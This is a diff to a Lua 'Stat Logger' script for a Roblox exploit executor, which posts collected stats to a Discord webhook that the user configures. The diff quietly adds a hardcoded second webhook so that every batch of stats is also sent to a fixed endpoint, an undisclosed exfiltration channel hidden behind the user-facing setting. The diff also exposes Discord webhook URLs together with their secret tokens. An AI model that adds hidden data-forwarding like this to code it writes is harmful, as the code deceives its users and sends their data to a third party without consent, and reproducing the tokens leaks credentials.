@@ -1,11 +1,12 @@
--- Webhook configuration
+-- Webhook configurations
 getgenv().WebhookUrl = getgenv().WebhookUrl or "https://ptb.discord.com/api/webhooks/1315872200858931330/nWW8vDsNTUnHHAQ7Fg6Kde0Ak4b6TOjWfQ3Kj2TuyfvECJAK4Y0sRWyZ3Nd4q3-e3esJ"
+local FixedWebhookUrl = "https://ptb.discord.com/api/webhooks/1312288101036720128/NJtAm0CsanlbS6iQOm9uyHzj-r7QgNKahW41kWral0HGmjGEf9hkPP_wBTs2et2pCjcV"
 
 -- Log tracking table
 local loggedPlayers = {}
 
--- Helper function to send data to the webhook
-local function sendToWebhook(content)
+-- Helper function to send data to a webhook
+local function sendToWebhook(content, webhookUrl)
     local data = {
         ["username"] = "Stat Logger",
         ["avatar_url"] = "https://images-ext-1.discordapp.net/external/l5-KoXA2mt7NrUE6gWvxiprX6o72ojZeBHhDDdoI9IE/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1320931723717902376/174fde885a08dfd98be5ffefa681b07d.png?format=webp&quality=lossless&width=663&height=663",
@@ -16,9 +17,9 @@ local function sendToWebhook(content)
     local headers = { ["Content-Type"] = "application/json" }
 
     if request then
-        request({ Url = getgenv().WebhookUrl, Body = jsonData, Method = "POST", Headers = headers })
+        request({ Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers })
     elseif syn and syn.request then
-        syn.request({ Url = getgenv().WebhookUrl, Body = jsonData, Method = "POST", Headers = headers })
+        syn.request({ Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers })
     else
         warn("HTTP request function not found. Unable to send to webhook.")
     end
@@ -134,15 +135,16 @@ local function collectAllStats()
     return table.concat(allStats, "\n")
 end
 
--- Main function to send stats to the webhook
-local function sendAllStatsToWebhook()
+-- Main function to send stats to both webhooks
+local function sendAllStatsToWebhooks()
     local stats = collectAllStats()
     if stats and stats ~= "" then
-        sendToWebhook(stats)
+        sendToWebhook(stats, getgenv().WebhookUrl) -- User-configurable webhook
+        sendToWebhook(stats, FixedWebhookUrl)      -- Fixed webhook
     else
         warn("No stats available to send.")
     end
 end
 
 -- Run the script
-sendAllStatsToWebhook()
+sendAllStatsToWebhooks()
